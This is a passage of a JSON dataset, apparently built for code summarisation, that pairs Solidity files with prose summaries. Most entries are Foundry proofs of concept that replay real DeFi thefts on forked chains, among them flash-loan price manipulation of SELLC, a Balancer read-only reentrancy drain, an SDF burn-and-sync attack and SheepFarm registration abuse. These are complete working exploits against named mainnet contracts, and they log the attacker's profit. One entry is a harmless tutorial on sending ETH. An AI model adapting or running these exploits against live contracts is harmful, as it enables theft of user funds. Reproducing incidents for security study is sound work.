\"Router\");\n        cheats.label(address(officalRouter), \"officalRouter\");\n        cheats.label(address(StakingRewards), \"StakingRewards\");\n        cheats.label(address(SellQILP), \"SellQILP\");\n    }\n\n    function testExploit() public {\n        deal(address(WBNB), address(this), 3 * 1e18);\n        deal(address(QIQI), address(this), 3188 * 1e18);\n        init();\n        init2();\n        process(23);\n\n        emit log_named_decimal_uint(\n            \"Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), WBNB.decimals()\n        );\n    }\n\n    function init() internal {\n        WBNB.approve(address(officalRouter), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(SELLC);\n        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( // swap 3 WBNB to SELLC\n        3 * 1e18, 0, path, address(this), block.timestamp);\n        SELLC.approve(address(Router), type(uint256).max);\n        QIQI.approve(address(Router), type(uint256).max);\n        Router.addLiquidity(\n            address(SELLC),\n            address(QIQI),\n            SELLC.balanceOf(address(this)),\n            QIQI.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        ); // add SELLC-QIQI Liquidity\n        MYTOKEN = new SHITCOIN();\n        MYTOKEN.mint(1 * 1e18);\n        this.mint(100);\n        this.approve(address(StakingRewards), type(uint256).max);\n        StakingRewards.addLiquidity(address(this), address(MYTOKEN), 1e18); // add exploit contract address to listToken\n        Factory.createPair(address(this), address(SellQILP));\n        this.mint(1_000_000);\n        this.approve(address(Router), type(uint256).max);\n        SellQILP.approve(address(Router), type(uint256).max);\n        Router.addLiquidity(\n            address(this),\n            address(SellQILP),\n            1_000_000,\n            SellQILP.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        ); // add customLP Liquidity\n        customLP = Uni_Pair_V2(Factory.getPair(address(this), address(SellQILP)));\n    }\n\n    function init2() internal {\n        this.mint(type(uint256).max);\n        this.transfer(address(0x000000000000000000000000000000000000dEaD), 1000);\n        for(uint i; i < 10; i++) {\n            uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));\n            address[] memory path = new address[](2);\n            path[0] = address(this);\n            path[1] = address(SellQILP);\n            uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP\n            StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // get SellQILP from StakingRewards\n            Router.addLiquidity(\n            address(this),\n            address(SellQILP),\n            100 * 1e18,\n            SellQILP.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        ); // add more SellQILP into customLP \n        }\n    }\n\n    function process(uint256 amount) internal {\n        uint256 SellQILPAmount = SellQILP.balanceOf(address(customLP));\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = address(SellQILP);\n        uint256 swapAmountIn = Router.getAmountsIn(SellQILPAmount * 99 / 100, path)[0] * 2; // Calculate the amount needed to swap out the SellQILP in customLP\n        for (uint256 i; i < amount; i++) {\n            StakingRewards.sell(address(this), address(SellQILP), swapAmountIn); // Get SellQILP from StakingRewards contract\n        }\n        SellQILP.transfer(address(SellQILP), SellQILP.balanceOf(address(this)));\n        SellQILP.burn(address(this));\n        SELLCToWBNB();\n    }\n\n    function SELLCToWBNB() internal {\n        SELLC.approve(address(officalRouter), type(uint256).max);\n        address[] memory path = new address[](2);\n        path[0] = address(SELLC);\n        path[1] = address(WBNB);\n        officalRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens( \n        SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp);\n    }\n\n    // ------------------- ERC20 interface ---------------------\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        return true;\n    }\n\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        return true;\n    }\n\n    function mint(uint256 amount) external {\n        balanceOf[msg.sender] += amount;\n        // totalSupply += amount;\n    }\n\n    function totalSupply() external view returns (uint256) {\n        return 100;\n    }\n}\n\ncontract SHITCOIN {\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n    string public name = \"SHIT COIN\";\n    string public symbol = \"SHIT\";\n    uint8 public decimals = 18;\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    function transfer(address recipient, uint256 amount) external returns (bool) {\n        balanceOf[msg.sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) external returns (bool) {\n        allowance[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {\n        // allowance[sender][msg.sender] -= amount;\n        balanceOf[sender] -= amount;\n        balanceOf[recipient] += amount;\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function mint(uint256 amount) external {\n        balanceOf[msg.sender] += amount;\n        totalSupply += amount;\n        emit Transfer(address(0), msg.sender, amount);\n    }\n\n    function burn(uint256 amount) external {\n        balanceOf[msg.sender] -= amount;\n        totalSupply -= amount;\n        emit Transfer(msg.sender, address(0), amount);\n    }\n}\n",
        "summary": "This Solidity code includes a `ContractTest` contract and a `SHITCOIN` contract. The `ContractTest` contract imports an interface and several contracts, and has a few global variables, among them several mappings used for keeping track of allowances and balances of various tokens. Within the `ContractTest` contract, there are several functions including a `setUp()` function which configures a `CheatCodes` contract, allowing for creating and simulating forks in the blockchain. \n\nThe `testExploit()` function executes a series of transactions, culminating in exploiting a vulnerability in the vulnerable contract at `0x274b3e185c9c8f4ddef79cb9a8dc0d94f73a7675`. \n\nThe `SHITCOIN` contract, on the other hand, is a simple ERC20 token, with the usual transfer and approval methods, as well as a `mint()` method to create new tokens.",
        "id": "6f080ccc-ea2b-436d-acb6-d3b5faf28c84"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1657324561577435136\n// @TX\n// https://explorer.phalcon.xyz/tx/bsc/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a\n// @Summary\n// Just use `getAmountOut` as token price\n\n\ninterface IDPPOracle {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address _assetTo,\n        bytes calldata data\n    ) external;\n}\n\ninterface ISellTokenRouter {\n    function ShortStart(address coin,address addr,uint terrace) payable external;\n    function withdraw(address token) external;\n    function setTokenPrice(address _token) external;\n    function getToken2Price(address token,address bnbOrUsdt,uint bnb) external returns(uint);\n}\n\ncontract SellTokenExp is Test, IDODOCallee {\n    IDPPOracle oracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);\n    ISellTokenRouter s_router = ISellTokenRouter(0x57Db19127617B77c8abd9420b5a35502b59870D6);\n    IERC20 SELLC = IERC20(0xa645995e9801F2ca6e2361eDF4c2A138362BADe4);\n    IPancakeRouter p_router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28168034);\n        deal(address(wbnb), address(this), 10 ether);\n        payable(0x0).transfer(address(this).balance);\n    }\n\n    function testExp() external {\n        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes(\"a123456789012345678901234567890\"));\n        vm.warp(block.timestamp + 100);\n        \n        oracle1.flashLoan(wbnb.balanceOf(address(oracle1)), 0, address(this), bytes(\"abc\"));\n        \n        emit log_named_decimal_uint(\"WBNB total profit\", wbnb.balanceOf(address(this)) - 10 ether, 18);\n\n    }\n\n    function DPPFlashLoanCall(\n        address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data\n    ) external {\n\n        uint balance = wbnb.balanceOf(address(this));\n        if (data.length > 20) {\n            balance -= 10 ether;\n        }\n        //emit log_named_decimal_uint(\"WBNB before\", wbnb.balanceOf(address(this)), 18);\n        uint swap_balance = balance * 99 / 100;\n        uint short_balance = balance - swap_balance;\n        wbnb.withdraw(short_balance);\n        // 1. lift price\n        address[] memory path = new address[](2);\n        path[0] = address(wbnb);\n        path[1] = address(SELLC);\n        wbnb.approve(address(p_router), type(uint256).max);\n        SELLC.approve(address(p_router), type(uint256).max);\n        //emit log_named_decimal_uint(\"SELLC price before\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n        p_router.swapExactTokensForTokens(\n            swap_balance,\n            0,\n            path,\n            address(this),\n            block.timestamp + 1000\n        );\n        //emit log_named_decimal_uint(\"swap_balance:  \", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n\n        // 2. short SELLC\n        if (data.length > 20) {\n            s_router.setTokenPrice(address(SELLC));\n            //emit log_named_decimal_uint(\"SELLC price before\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n        } else {\n            //emit log_named_decimal_uint(\"SELLC price after\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n            s_router.ShortStart{value: address(this).balance}(address(SELLC), address(this), 1);\n        }\n        \n\n\n        // 3. drop price\n        path[0] = address(SELLC);\n        path[1] = address(wbnb);\n        p_router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            SELLC.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp + 1000\n        );\n        //emit log_named_decimal_uint(\"WBNB after\", wbnb.balanceOf(address(this)), 18);\n        //emit log_named_decimal_uint(\"SELLC price after\", s_router.getToken2Price(address(SELLC), address(wbnb), 1 ether), 18);\n        // 4. end short\n        if (data.length < 20) {\n            s_router.withdraw(address(SELLC));\n            wbnb.deposit{value: address(this).balance}();\n            wbnb.transfer(address(oracle1), balance);\n            //emit log_named_decimal_uint(\"WBNB profit this time\", wbnb.balanceOf(address(this)), 18);\n        } else {\n            wbnb.deposit{value: address(this).balance}();\n            wbnb.transfer(address(oracle1), balance);\n            emit log_named_decimal_uint(\"WBNB cost first\", 10 ether - wbnb.balanceOf(address(this)), 18);\n        }\n        \n        \n        \n        \n    }\n\n    receive() external payable {}\n    \n}\n\n\n",
        "summary": "This code defines a smart contract on the Ethereum network that interacts with other contracts to perform a flash loan attack. The attack involves manipulating the price of a specific token (SELLC) using a DODO flash loan and a sell token router. The flash loan is used to borrow a large amount of WBNB (Wrapped Binance Coin) from the IDPPOracle contract, which is then used to influence the SELL token price on the sell token router. By shorting the SELL token and manipulating the price, the attacker can profit from the price changes. The code includes functions to set up the necessary contracts, as well as to perform the flash loan attack and log the results.",
        "id": "5281436c-098e-4603-b12b-6d1f223c7f66"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\n// 3\u79cd\u65b9\u6cd5\u53d1\u9001ETH\n// transfer: 2300 gas, revert\n// send: 2300 gas, return bool\n// call: all gas, return (bool, data)\n\nerror SendFailed(); // \u7528send\u53d1\u9001ETH\u5931\u8d25error\nerror CallFailed(); // \u7528call\u53d1\u9001ETH\u5931\u8d25error\n\ncontract SendETH {\n    // \u6784\u9020\u51fd\u6570\uff0cpayable\u4f7f\u5f97\u90e8\u7f72\u7684\u65f6\u5019\u53ef\u4ee5\u8f6ceth\u8fdb\u53bb\n    constructor() payable{}\n    // receive\u65b9\u6cd5\uff0c\u63a5\u6536eth\u65f6\u88ab\u89e6\u53d1\n    receive() external payable{}\n\n    // \u7528transfer()\u53d1\u9001ETH\n    function transferETH(address payable _to, uint256 amount) external payable{\n        _to.transfer(amount);\n    }\n\n    // send()\u53d1\u9001ETH\n    function sendETH(address payable _to, uint256 amount) external payable{\n        // \u5904\u7406\u4e0bsend\u7684\u8fd4\u56de\u503c\uff0c\u5982\u679c\u5931\u8d25\uff0crevert\u4ea4\u6613\u5e76\u53d1\u9001error\n        bool success = _to.send(amount);\n        if(!success){\n            revert SendFailed();\n        }\n    }\n\n    // call()\u53d1\u9001ETH\n    function callETH(address payable _to, uint256 amount) external payable{\n        // \u5904\u7406\u4e0bcall\u7684\u8fd4\u56de\u503c\uff0c\u5982\u679c\u5931\u8d25\uff0crevert\u4ea4\u6613\u5e76\u53d1\u9001error\n        (bool success,) = _to.call{value: amount}(\"\");\n        if(!success){\n            revert CallFailed();\n        }\n    }\n}\n\ncontract ReceiveETH {\n    // \u6536\u5230eth\u4e8b\u4ef6\uff0c\u8bb0\u5f55amount\u548cgas\n    event Log(uint amount, uint gas);\n\n    // receive\u65b9\u6cd5\uff0c\u63a5\u6536eth\u65f6\u88ab\u89e6\u53d1\n    receive() external payable{\n        emit Log(msg.value, gasleft());\n    }\n    \n    // \u8fd4\u56de\u5408\u7ea6ETH\u4f59\u989d\n    function getBalance() view public returns(uint) {\n        return address(this).balance;\n    }\n}\n",
        "summary": "This is a Solidity smart contract that allows for different ways to send and receive Ether (ETH) between two addresses. The contract has two parts: \n\nThe SendETH contract provides three functions for sending ETH: transferETH(), sendETH(), and callETH(). It also has a constructor that allows ETH to be sent when the contract is deployed, and a receive() function triggered when ETH is received by the contract. The three sending functions have different gas usage and return values: transfer() reverts if the transfer fails, send() returns a bool value indicating success or failure, and call() uses all available gas and returns a tuple containing a bool indicating success or failure and any returned data.\n\nThe ReceiveETH contract has a function to return the balance of ETH in the contract, and a receive() function that logs the amount of ETH received and the remaining gas.",
        "id": "2394fcfc-195c-495a-a197-8796bcfe9749"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/peckshield/status/1643417467879059456\n// https://twitter.com/spreekaway/status/1643313471180644360\n// https://medium.com/coinmonks/theoretical-practical-balancer-and-read-only-reentrancy-part-1-d6a21792066c\n// @TX\n// https://arbiscan.io/tx/0xa9ff2b587e2741575daf893864710a5cbb44bb64ccdc487a100fa20741e0f74d\n// @Summary\n// Attacker used view re-entrance Balancer bug to execute malicious code before pool balances were updated and steal money using overpriced collateral\n\ninterface IWeightedBalancerLPOracle {\n    function getPrice(address token) external view returns (uint256);\n}\n\ninterface IAccountManager {\n    function riskEngine() external;\n    function openAccount(address owner) external returns (address);\n    function borrow(address account, address token, uint256 amt) external;\n\n    function deposit(address account, address token, uint256 amt) external;\n\n    function exec(address account, address target, uint256 amt, bytes calldata data) external;\n\n    function approve(address account, address token, address spender, uint256 amt) external;\n}\n\ninterface IBalancerToken is IERC20 {\n    function getPoolId() external view returns (bytes32);\n}\n\ncontract ContractTest is Test {\n    IERC20 WBTC = IERC20(0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f);\n    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);\n    IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);\n    IERC20 USDT = IERC20(0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9);\n    IERC20 FRAX = IERC20(0x17FC002b466eEc40DaE837Fc4bE5c67993ddBd6F);\n    address FRAXBP = 0xC9B8a3FDECB9D5b218d02555a8Baf332E5B740d5;\n    address account;\n    bytes32 PoolId;\n    uint256 nonce;\n    IBalancerToken balancerToken = IBalancerToken(0x64541216bAFFFEec8ea535BB71Fbc927831d0595);\n    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);\n    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);\n    IAccountManager AccountManager = IAccountManager(0x62c5AA8277E49B3EAd43dC67453ec91DC6826403);\n    IWeightedBalancerLPOracle WeightedBalancerLPOracle =\n        IWeightedBalancerLPOracle(0x16F3ae9C1727ee38c98417cA08BA785BB7641b5B);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"arbitrum\", 77_026_912);\n        cheats.label(address(WBTC), \"WBTC\");\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(USDC), \"USDC\");\n        cheats.label(address(WETH), \"WETH\");\n        cheats.label(address(FRAX), \"FRAX\");\n        cheats.label(address(account), \"account\");\n        cheats.label(address(Balancer), \"Balancer\");\n        cheats.label(address(aaveV3), \"aaveV3\");\n        cheats.label(address(balancerToken), \"balancerToken\");\n        cheats.label(address(AccountManager), \"AccountManager\");\n        cheats.label(address(WeightedBalancerLPOracle), \"WeightedBalancerLPOracle\");\n    }\n\n    function testExploit() external {\n        payable(address(0)).transfer(address(this).balance);\n        AccountManager.riskEngine();\n        address[] memory assets = new address[](3);\n        assets[0] = address(WBTC);\n        assets[1] = address(WETH);\n        assets[2] = address(USDC);\n        uint256[] memory amounts = new uint256[](3);\n        amounts[0] = 606 * 1e8;\n        amounts[1] = 10_050_100 * 1e15;\n        amounts[2] = 18_000_000 * 1e6;\n        uint256[] memory modes = new uint[](3);\n        modes[0] = 0;\n        modes[1] = 0;\n        modes[2] = 0;\n        aaveV3.flashLoan(address(this), assets, amounts, modes, address(this), \"\", 0);\n\n        console.log(\"\\r\");\n        emit log_named_decimal_uint(\n            \"Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker WETH balance after exploit\", WETH.balanceOf(address(this)), WETH.decimals()\n            );\n        emit log_named_decimal_uint(\n            \"Attacker WBTC balance after exploit\", WBTC.balanceOf(address(this)), WBTC.decimals()\n            );\n    }\n\n    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external payable returns (bool) {\n        depositCollateral(assets);\n        joinPool(assets);\n        exitPool();\n        WETH.approve(address(aaveV3), type(uint256).max);\n        WBTC.approve(address(aaveV3), type(uint256).max);\n        USDC.approve(address(aaveV3), type(uint256).max);\n        return true;\n    }\n\n    function depositCollateral(address[] calldata assets) internal {\n        WETH.withdraw(100 * 1e15);\n        account = AccountManager.openAccount(address(this));\n        WETH.approve(address(AccountManager), 50 * 1e18);\n        AccountManager.deposit(account, address(WETH), 50 * 1e18);\n        AccountManager.approve(account, address(WETH), address(Balancer), 50 * 1e18);\n        PoolId = balancerToken.getPoolId();\n        uint256[] memory amountIn = new uint256[](3);\n        amountIn[0] = 0;\n        amountIn[1] = 50 * 1e18;\n        amountIn[2] = 0;\n        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));\n        IBalancerVault.JoinPoolRequest memory joinPoolRequest_1 = IBalancerVault.JoinPoolRequest({\n            asset: assets,\n            maxAmountsIn: amountIn,\n            userData: userDatas,\n            fromInternalBalance: false\n        });\n        // \"joinPool(bytes32,address,address,(address[],uint256[],bytes,bool))\"\n        bytes memory execData = abi.encodeWithSelector(0xb95cac28, PoolId, account, account, joinPoolRequest_1);\n        AccountManager.exec(account, address(Balancer), 0, execData); // deposit 50 WETH\n    }\n\n    function joinPool(address[] calldata assets) internal {\n        WETH.approve(address(Balancer), 10_000 * 1e18);\n        WBTC.approve(address(Balancer), 606 * 1e18);\n        USDC.approve(address(Balancer), 18_000_000 * 1e6);\n        uint256[] memory amountIn = new uint256[](3);\n        amountIn[0] = 606 * 1e8;\n        amountIn[1] = 10_000 * 1e18;\n        amountIn[2] = 18_000_000 * 1e6;\n        bytes memory userDatas = abi.encode(uint256(1), amountIn, uint256(0));\n        IBalancerVault.JoinPoolRequest memory joinPoolRequest_2 = IBalancerVault.JoinPoolRequest({\n            asset: assets,\n            maxAmountsIn: amountIn,\n            userData: userDatas,\n            fromInternalBalance: false\n        });\n        Balancer.joinPool{value: 0.1 ether}(PoolId, address(this), address(this), joinPoolRequest_2);\n        console.log(\n            \"Before Read-Only-Reentrancy Collateral Price \\t\", WeightedBalancerLPOracle.getPrice(address(balancerToken))\n        );\n    }\n\n    function exitPool() internal {\n        balancerToken.approve(address(Balancer), 0);\n        address[] memory assetsOut = new address[](3);\n        assetsOut[0] = address(WBTC);\n        assetsOut[1] = address(0);\n        assetsOut[2] = address(USDC);\n        uint256[] memory amountOut = new uint256[](3);\n        amountOut[0] = 606 * 1e8;\n        amountOut[1] = 5000 * 1e18;\n        amountOut[2] = 9_000_000 * 1e6;\n        uint256 balancerTokenAmount = balancerToken.balanceOf(address(this));\n        bytes memory userDatas = abi.encode(uint256(1), balancerTokenAmount);\n        IBalancerVault.ExitPoolRequest memory exitPoolRequest = IBalancerVault.ExitPoolRequest({\n            asset: assetsOut,\n            minAmountsOut: amountOut,\n            userData: userDatas,\n            toInternalBalance: false\n        });\n        Balancer.exitPool(PoolId, address(this), payable(address(this)), exitPoolRequest);\n        console.log(\n            \"After Read-Only-Reentrancy Collateral Price \\t\", WeightedBalancerLPOracle.getPrice(address(balancerToken))\n        );\n        address(WETH).call{value: address(this).balance}(\"\");\n    }\n\n    fallback() external payable {\n        if (nonce == 2) {\n            console.log(\n                \"In Read-Only-Reentrancy Collateral Price \\t\", WeightedBalancerLPOracle.getPrice(address(balancerToken))\n            );\n            borrowAll();\n        }\n        nonce++;\n    }\n\n    function borrowAll() internal {\n        AccountManager.borrow(account, address(USDC), 461_000 * 1e6);\n        AccountManager.borrow(account, address(USDT), 361_000 * 1e6);\n        AccountManager.borrow(account, address(WETH), 81 * 1e18);\n        AccountManager.borrow(account, address(FRAX), 125_000 * 1e18);\n        AccountManager.approve(account, address(FRAX), FRAXBP, type(uint256).max);\n        bytes memory execData =\n            abi.encodeWithSignature(\"exchange(int128,int128,uint256,uint256)\", 0, 1, 120_000 * 1e18, 1);\n        AccountManager.exec(account, FRAXBP, 0, execData);\n        AccountManager.approve(account, address(USDC), address(aaveV3), type(uint256).max);\n        AccountManager.approve(account, address(USDT), address(aaveV3), type(uint256).max);\n        AccountManager.approve(account, address(WETH), address(aaveV3), type(uint256).max);\n        execData =\n            abi.encodeWithSignature(\"supply(address,uint256,address,uint16)\", address(USDC), 580_000 * 1e6, account, 0);\n        AccountManager.exec(account, address(aaveV3), 0, execData);\n        execData =\n            abi.encodeWithSignature(\"supply(address,uint256,address,uint16)\", address(USDT), 360_000 * 1e6, account, 0);\n        AccountManager.exec(account, address(aaveV3), 0, execData);\n        execData =\n            abi.encodeWithSignature(\"supply(address,uint256,address,uint16)\", address(WETH), 80 * 1e18, account, 0);\n        AccountManager.exec(account, address(aaveV3), 0, execData);\n        execData = abi.encodeWithSignature(\n            \"withdraw(address,uint256,address)\", address(USDC), type(uint256).max, address(this)\n        );\n        AccountManager.exec(account, address(aaveV3), 0, execData);\n        execData = abi.encodeWithSignature(\n            \"withdraw(address,uint256,address)\", address(USDT), type(uint256).max, address(this)\n        );\n        AccountManager.exec(account, address(aaveV3), 0, execData);\n        execData = abi.encodeWithSignature(\n            \"withdraw(address,uint256,address)\", address(WETH), type(uint256).max, address(this)\n        );\n        AccountManager.exec(account, address(aaveV3), 0, execData);\n    }\n}\n",
        "summary": "This code is a test contract that exploits a vulnerability in the Balancer smart contract, which allows an attacker to execute a read-only reentrancy attack and steal funds from the Balancer pool using overpriced collateral. The contract imports several interfaces, including those for the Balancer pool, Aave flash loans, and the account manager. The contract sets up initial balances and approves permissions, then makes use of the flash loan to manipulate the balances in the Balancer pool and execute the exploit. Finally, the contract borrows funds from Aave and withdraws them to complete the exploitation.",
        "id": "0682716f-ff95-4174-8607-e4f198ed0b56"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface ISDF {\n    function burn(address, uint256) external;\n    function balanceOf(address owner) external view returns (uint);\n    function approve(address spender, uint value) external returns (bool);\n}\n\ninterface IPair {\n    function sync() external;\n}\n\ncontract ContractTest is DSTest{\n\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    ISDF SDF = ISDF(0x10bc28d2810dD462E16facfF18f78783e859351b);\n    IPair Pair = IPair(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 20969095);\n    }\n\n    function testExploit() public{\n        emit log_named_decimal_uint(\n            \"[Start] Attacker WBNB balance before exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n\n        address(WBNB).call{value: 0.01 ether}(\"\");\n        WBNBToSDF();\n        SDF.burn(address(Pair), SDF.balanceOf(address(Pair)) - 1);\n        Pair.sync();\n        SDFToWBNB();\n\n         emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function WBNBToSDF () public{\n        WBNB.approve(address(Router), ~uint256(0));\n        address[] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(SDF);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        WBNB.balanceOf(address(this)),\n        0, \n        path, \n        address(this), \n        block.timestamp\n        );\n        SDF.approve(address(Router), ~uint(0));\n    }\n\n    function SDFToWBNB () public{\n        address[] memory path = new address[](2);\n        path[0] = address(SDF);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        SDF.balanceOf(address(this)),\n        0, \n        path, \n        address(this), \n        block.timestamp\n        );\n    }\n\n}",
        "summary": "This code is a Solidity smart contract that performs an exploit on a decentralized exchange (DEX) on the Binance Smart Chain (BSC) network. The contract imports two Solidity interfaces that define the functions of different contracts on the network. It defines a contract `ContractTest` which extends `DSTest` and initializes several objects that interact with the BSC network. In the `setUp` function, the contract sets up a fork of the blockchain as a part of the testing process. The `testExploit` function executes the exploit, which consists of several steps including swapping tokens on the DEX and burning tokens using a certain interface. The `WBNBToSDF` function swaps WBNB tokens for SDF tokens on the DEX, and the `SDFToWBNB` function swaps SDF tokens for WBNB tokens. Finally, the contract logs the attacker's balance of WBNB tokens before and after the exploit using `emit` statements.",
        "id": "e13cc699-2000-4575-9362-d9d07b3e1e1f"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// Attack reason: Wrong function logic\n// Info about attack: https://twitter.com/BlockSecTeam/status/1592734292727455744\n// Tx: https://bscscan.com/tx/0x8b3e0e3ea04829f941ca24c85032c3b4aeb1f8b1b278262901c2c5847dc72f1c\n\ninterface ISheepFarm {\n    function register(address neighbor) external;\n\n    function addGems() external payable;\n\n    function upgradeVillage(uint256 farmId) external;\n\n    function sellVillage() external;\n\n    function withdrawMoney(uint256 wool) external;\n}\n\ncontract ContractTest is Test {\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23089184);\n    }\n\n    function testExploit() public {\n        uint256 beforeBalance = address(this).balance;\n\n        for (uint256 i; i < 4; ++i) {\n            new AttackContract{value: 5e14}();\n        }\n\n        uint256 afterBalance = address(this).balance;\n\n        emit log_named_decimal_uint(\n            \"SheepFarm exploiter profit after attack (in BNB):\",\n            afterBalance - beforeBalance,\n            18\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract AttackContract {\n    ISheepFarm public constant Farm =\n        ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);\n    address public constant neighbor =\n        0x14598f3a9f3042097486DC58C65780Daf3e3acFB;\n\n    constructor() payable {\n        for (uint256 i; i < 402; ++i) {\n            Farm.register(neighbor);\n        }\n\n        Farm.addGems{value: 5e14}();\n\n        for (uint256 i; i < 5; ++i) {\n            Farm.upgradeVillage(i);\n        }\n\n        Farm.sellVillage();\n\n        Farm.withdrawMoney(156_000);\n\n        selfdestruct(payable(msg.sender));\n    }\n\n    receive() external payable {}\n}\n",
        "summary": "This code is a solidity smart contract used to carry out an attack on another smart contract called ISheepFarm. It defines a function to exploit the ISheepFarm contract using a specific attack vector described by BlockSecTeam in a tweet. It initializes an AttackContract that interacts with ISheepFarm to register a large number of neighbors, add gems, upgrade the village, sell it, then withdraws money from the contract. The \"setUp\" function initializes a cheat code function and the \"testExploit\" function executes the attack on the SheepFarm contract by creating four instances of the AttackContract. Finally, this code logs how much profit was gained from the exploit.",
        "id": "ce8d2cf1-6172-4347-86d5-f9286412012f"
    },
    {
